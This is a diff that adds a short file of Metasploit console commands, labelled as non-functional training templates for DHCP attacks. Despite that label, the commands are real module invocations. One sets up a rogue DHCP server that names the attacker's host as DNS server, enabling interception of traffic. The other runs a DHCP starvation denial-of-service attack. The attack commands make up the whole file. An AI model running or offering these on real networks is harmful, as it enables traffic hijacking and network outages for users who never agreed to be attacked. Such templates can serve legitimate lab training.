@@ -1,0 +1,15 @@
+# DHCP Attack Templates
+# For Training Use – Non-functional Template
+
+use auxiliary/server/dhcp
+set SRVHOST <LHOST>
+set NETMASK 255.255.255.0
+set DNSSERVER <LHOST>
+set ROUTER <GATEWAY_IP>
+set BROADCAST <BROADCAST_IP>
+run -j
+
+use auxiliary/dos/dhcp/dhcp_discover_exhaustion
+set INTERFACE eth0
+set THREADS 10
+run
